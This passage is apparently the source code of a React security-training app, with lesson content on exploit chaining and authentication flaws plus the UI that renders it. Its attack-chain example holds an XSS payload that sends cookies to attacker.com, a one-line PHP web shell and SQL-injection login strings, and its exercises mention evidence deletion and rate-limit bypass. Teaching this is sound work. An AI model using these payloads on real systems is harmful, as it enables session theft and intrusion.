        content: 'Real-world attacks rarely exploit single vulnerabilities. They chain multiple flaws together for maximum impact.\n\nWhy chain vulnerabilities:\n• Single flaw might not be enough\n• Achieve objectives unfeasible individually\n• Bypass multiple security controls\n• Escalate privileges progressively\n• Increase impact and damage\n\nCommon chains:\n1. SQLi → Authentication Bypass → RCE\n2. SSRF → XXE → Code Execution\n3. XSS → CSRF → Account Takeover\n4. File Upload → Path Traversal → RCE\n5. Information Disclosure → SQLi → Full Compromise\n\nChaining strategy:\n• Reconnaissance (gather info)\n• Identify vulnerabilities\n• Find connection points\n• Execute step-by-step\n• Maintain access',
      },
      {
        type: 'code',
        title: 'Attack Chain Example: SQLi → Admin Access → RCE',
        content: `// Vulnerable application workflow

// Step 1: SQL Injection to bypass authentication
const adminUser = "admin' --";
const query = \`SELECT * FROM users WHERE username = '\${adminUser}' AND password = '*'\`;
// Comment out password check, get admin user

// Step 2: Use XSS to steal admin session
const xssPayload = "<script>fetch('https://attacker.com/?c='+document.cookie)</script>";
// Admin views comment with payload
// Session cookie stolen

// Step 3: Hijack session and access admin panel
const adminSession = stolenCookie;
const response = await fetch('/admin', {
  headers: { Cookie: adminSession }
});

// Step 4: Find file upload vulnerability
const webshell = \`<?php system($_GET['cmd']); ?>\`;
// Upload as shell.php.jpg via admin panel

// Step 5: Execute commands
await fetch('/uploads/shell.php.jpg?cmd=id');
// Remote code execution achieved

// Full attack chain:
// SQLi (auth bypass) → XSS (session theft) → Admin access → File upload RCE`,
        codeLanguage: 'javascript',
      },
      {
        type: 'code',
        title: 'Defense Against Exploit Chains',
        content: `// Secure architecture prevents chaining

// 1. Prevent first vulnerability (input validation)
function sanitizeInput(input) {
  return input
    .replace(/[^a-zA-Z0-9]/g, '')
    .substring(0, 50);
}

// 2. Implement defense in depth
app.use(helmet()); // Security headers
app.use(express.json({ limit: '10kb' })); // Size limit
app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 100 }));

// 3. Content Security Policy prevents XSS
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'"
  );
  next();
});

// 4. Session security prevents hijacking
app.use(session({
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'
  }
}));

// 5. File upload validation prevents RCE
const validateFile = (file) => {
  if (file.size > 5 * 1024 * 1024) throw new Error('Too large');
  if (!['image/jpeg', 'image/png'].includes(file.mimetype)) {
    throw new Error('Invalid type');
  }
  // Additional checks
};

// 6. Privilege separation limits damage
app.post('/admin', authenticate, authorize('admin'), (req, res) => {
  // Only authenticated admins can access
});`,
        codeLanguage: 'javascript',
      },
      {
        type: 'example',
        title: 'Real-World Attack Chains',
        content: 'Chain 1: Cloud Account Compromise\n• Discover SSRF endpoint\n• Use SSRF to access AWS metadata\n• Steal temporary credentials\n• Assume IAM role\n• Access S3 buckets with credentials\n• Exfiltrate sensitive data\n\nChain 2: Supply Chain Attack\n• Find vulnerable dependency\n• Exploit deserialization flaw\n• Execute code in CI/CD\n• Inject backdoor in build\n• Deploy to production\n• Compromise all users\n\nChain 3: Database Breach\n• Identify LFI vulnerability\n• Read database config\n• Obtain database credentials\n• Connect to database\n• Dump all user data\n• Sell on dark market\n\nChain 4: Admin Takeover\n• Find password reset flaw\n• Bypass email verification\n• Reset admin password\n• Login as admin\n• Access audit logs\n• Delete evidence\n• Maintain persistence',
      },
      {
        type: 'exercise',
        title: 'Advanced Exploit Chain Challenges',
        content: 'Challenge 1: SQLi to RCE\n• Find SQL injection point\n• Bypass authentication\n• Access admin panel\n• Upload malicious file\n• Execute arbitrary commands\n\nChallenge 2: SSRF to Data Breach\n• Identify SSRF vulnerability\n• Access internal database\n• Extract credentials\n• Use credentials to access admin panel\n• Download user database\n\nChallenge 3: Full Account Takeover\n• Find multiple vulnerabilities\n• Chain them together\n• Gain unauthorized access\n• Maintain persistence\n• Cover tracks\n\nChallenge 4: Zero-day Exploitation\n• Analyze application behavior\n• Identify unknown vulnerabilities\n• Chain with known exploits\n• Achieve complete system compromise\n• Demonstrate impact',
      },
      {
        type: 'tip',
        title: 'Security Best Practices',
        content: '✓ Implement defense in depth (multiple layers)\n✓ Validate all inputs strictly\n✓ Use allowlist approach for validation\n✓ Implement proper error handling\n✓ Use security headers\n✓ Implement logging and monitoring\n✓ Regular security audits\n✓ Penetration testing\n✓ Incident response plan\n✓ Secure development practices\n✓ Keep software updated\n✓ Implement privilege separation\n✓ Use Web Application Firewall\n✓ Security training for developers',
      },
    ],
    'Basic Authentication': [
      {
        type: 'theory',
        title: 'Authentication Fundamentals',
        content: 'Authentication is the process of verifying the identity of a user or system. Common vulnerabilities include:\n\n• Weak Passwords: Easy to guess or crack\n• Credential Stuffing: Using leaked credentials\n• Brute Force: Trying many password combinations\n• Session Fixation: Forcing a known session ID\n• Broken Password Reset: Exploiting reset mechanism\n\nAuthentication Flow:\n1. User provides credentials\n2. Server validates credentials\n3. Server creates session/token\n4. Client stores session/token\n5. Client sends token with each request',
      },
      {
        type: 'code',
        title: 'Insecure Authentication',
        content: `// INSECURE: Plain text passwords
app.post('/register', (req, res) => {
  const { username, password } = req.body;
  db.insert({
    username,
    password: password  // Stored in plain text!
  });
});

// INSECURE: No rate limiting
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const user = db.findOne({ username, password });
  if (user) {
    req.session.userId = user.id;
    res.json({ success: true });
  } else {
    res.json({ success: false });
  }
});

// INSECURE: Predictable session IDs
function generateSessionId() {
  return Date.now().toString(); // Easy to guess!
}`,
        codeLanguage: 'javascript',
      },
      {
        type: 'code',
        title: 'Secure Authentication',
        content: `const bcrypt = require('bcrypt');
const crypto = require('crypto');

// SECURE: Hash passwords
app.post('/register', async (req, res) => {
  const { username, password } = req.body;

  // Validate password strength
  if (password.length < 8) {
    return res.status(400).json({ error: 'Password too short' });
  }

  const hashedPassword = await bcrypt.hash(password, 10);
  db.insert({ username, password: hashedPassword });
  res.json({ success: true });
});

// SECURE: Compare hashed passwords
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Rate limiting check
  if (isRateLimited(req.ip)) {
    return res.status(429).json({ error: 'Too many attempts' });
  }

  const user = db.findOne({ username });
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const valid = await bcrypt.compare(password, user.password);
  if (valid) {
    req.session.userId = user.id;
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// SECURE: Generate secure session IDs
function generateSessionId() {
  return crypto.randomBytes(32).toString('hex');
}`,
        codeLanguage: 'javascript',
      },
      {
        type: 'example',
        title: 'Common Attack Techniques',
        content: 'Default Credentials:\n• admin/admin\n• admin/password\n• root/root\n\nSQL Injection in Login:\n• Username: admin\'--\n• Password: anything\n\nBrute Force:\n• Automated password guessing\n• Use tools like Hydra, Burp Suite\n\nSession Hijacking:\n• Steal session cookie via XSS\n• Intercept unencrypted traffic\n• Session fixation attacks\n\nPassword Reset Exploitation:\n• Predictable reset tokens\n• Account enumeration\n• Token not expiring',
      },
      {
        type: 'exercise',
        title: 'Practice Tasks',
        content: 'Authentication Bypass Lab exercises:\n\n1. SQL Injection Login:\n   - Username: admin\'--\n   - Password: (leave empty)\n\n2. Default Credentials:\n   - Try common username/password combinations\n   - admin/admin, test/test, root/toor\n\n3. Session Analysis:\n   - Login and capture your session cookie\n   - Analyze the session ID format\n   - Is it predictable?\n\n4. Brute Force:\n   - Use a small password list\n   - Implement rate limiting bypass\n   - Document your findings',
      },
      {
        type: 'tip',
        title: 'Security Best Practices',
        content: '✓ Use bcrypt/Argon2 for password hashing\n✓ Implement account lockout after failed attempts\n✓ Use CAPTCHA to prevent automated attacks\n✓ Implement Multi-Factor Authentication (MFA)\n✓ Use secure session management\n✓ Set HTTPOnly and Secure flags on cookies\n✓ Implement password strength requirements\n✓ Use HTTPS for all authentication\n✓ Implement secure password reset mechanism\n✓ Never reveal if username or password was wrong',
      },
    ],
  };

  const content = moduleContent[moduleName] || [
    {
      type: 'theory',
      title: 'Content Coming Soon',
      content: 'Detailed content for this module is being prepared. Check back soon!',
    },
  ];

  const handleSectionComplete = (index: number) => {
    setCompletedSections(new Set(completedSections).add(index));
    if (index < content.length - 1) {
      setCurrentSection(index + 1);
    }
  };

  const currentContent = content[currentSection];
  const progress = ((completedSections.size / content.length) * 100).toFixed(0);

  const getIcon = (type: string) => {
    switch (type) {
      case 'theory': return BookOpen;
      case 'code': return Code;
      case 'exercise': return Terminal;
      case 'tip': return Lightbulb;
      default: return BookOpen;
    }
  };

  const getColorClass = (type: string) => {
    switch (type) {
      case 'theory': return 'from-blue-500 to-blue-600';
      case 'code': return 'from-emerald-500 to-emerald-600';
      case 'exercise': return 'from-orange-500 to-orange-600';
      case 'tip': return 'from-yellow-500 to-yellow-600';
      default: return 'from-gray-500 to-gray-600';
    }
  };

  const allCompleted = completedSections.size === content.length;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4 overflow-y-auto">
      <div className="bg-white rounded-xl shadow-2xl max-w-5xl w-full max-h-[90vh] overflow-hidden flex flex-col">
        <div className="bg-gradient-to-r from-emerald-600 to-teal-600 text-white p-6">
          <div className="flex items-center justify-between mb-4">
            <div>
              <h2 className="text-2xl font-bold">{moduleName}</h2>
              <p className="text-emerald-50 mt-1">{level} Level</p>
            </div>
            <button
              onClick={onClose}
              className="p-2 hover:bg-white/20 rounded-lg transition-colors"
            >
              <X className="h-6 w-6" />
            </button>
          </div>
          <div>
            <div className="flex items-center justify-between mb-2">
              <span className="text-sm font-medium">Progress</span>
              <span className="text-sm font-semibold">{progress}%</span>
            </div>
            <div className="w-full bg-emerald-800 rounded-full h-2">
              <div
                className="bg-white h-2 rounded-full transition-all duration-300"
                style={{ width: `${progress}%` }}
              ></div>
            </div>
          </div>
        </div>

        <div className="flex-1 overflow-y-auto p-6">
          <div className="max-w-3xl mx-auto space-y-6">
            <div className="flex space-x-2 overflow-x-auto pb-4">
              {content.map((section, index) => {
                const Icon = getIcon(section.type);
                const isCompleted = completedSections.has(index);
                const isCurrent = index === currentSection;

                return (
                  <button
                    key={index}
                    onClick={() => setCurrentSection(index)}
                    className={`flex items-center space-x-2 px-4 py-2 rounded-lg transition-all whitespace-nowrap ${
                      isCurrent
                        ? 'bg-emerald-600 text-white'
                        : isCompleted
                        ? 'bg-emerald-100 text-emerald-800'
                        : 'bg-gray-100 text-gray-700'
                    }`}
                  >
                    {isCompleted ? (
                      <CheckCircle className="h-4 w-4" />
                    ) : (
                      <Icon className="h-4 w-4" />
                    )}
                    <span className="text-sm font-medium">
                      {index + 1}. {section.type.charAt(0).toUpperCase() + section.type.slice(1)}
                    </span>
                  </button>
                );
              })}
            </div>

            <div className={`bg-gradient-to-r ${getColorClass(currentContent.type)} rounded-xl p-6 text-white`}>
              <div className="flex items-center space-x-3 mb-2">
                {(() => {
                  const Icon = getIcon(currentContent.type);
                  return <Icon className="h-6 w-6" />;
                })()}
                <h3 className="text-xl font-bold">{currentContent.title}</h3>
              </div>
              <p className="text-sm opacity-90">
                Section {currentSection + 1} of {content.length}
              </p>
            </div>

            <div className="bg-white border-2 border-gray-200 rounded-xl p-6">
              {currentContent.codeLanguage ? (
                <pre className="bg-gray-900 text-green-400 p-6 rounded-lg overflow-x-auto font-mono text-sm whitespace-pre-wrap">
                  {currentContent.content}
                </pre>
              ) : (
                <div className="prose prose-lg max-w-none">
                  <p className="text-gray-800 whitespace-pre-line leading-relaxed">
                    {currentContent.content}
                  </p>
                </div>
              )}
            </div>

            <div className="flex items-center justify-between pt-4">
              <button
                onClick={() => setCurrentSection(Math.max(0, currentSection - 1))}
                disabled={currentSection === 0}
                className="px-6 py-3 bg-gray-200 text-gray-700 rounded-lg hover:bg-gray-300 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
              >
                Previous
              </button>

              {currentSection < content.length - 1 ? (
                <button
                  onClick={() => handleSectionComplete(currentSection)}
                  className="px-6 py-3 bg-emerald-600 text-white rounded-lg hover:bg-emerald-700 transition-colors font-semibold"
                >
                  Mark Complete & Continue
                </button>
              ) : (
                <button
                  onClick={() => {
                    handleSectionComplete(currentSection);
                    if (onComplete) {
                      onComplete();
                    }
                  }}
                  className="px-6 py-3 bg-emerald-600 text-white rounded-lg hover:bg-emerald-700 transition-colors font-semibold"
                >
                  {allCompleted ? 'Close' : 'Complete Module'}
                </button>
              )}
            </div>
          </div>
        </div>

        {allCompleted && (
          <div className="bg-emerald-50 border-t-4 border-emerald-500 p-6">
            <div className="flex items-center space-x-3">
              <CheckCircle className="h-8 w-8 text-emerald-600" />
              <div>
                <h3 className="font-bold text-emerald-900 text-lg">Module Completed!</h3>
                <p className="text-emerald-800 text-sm">
                  Great work! You've completed all sections of this module.
                </p>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
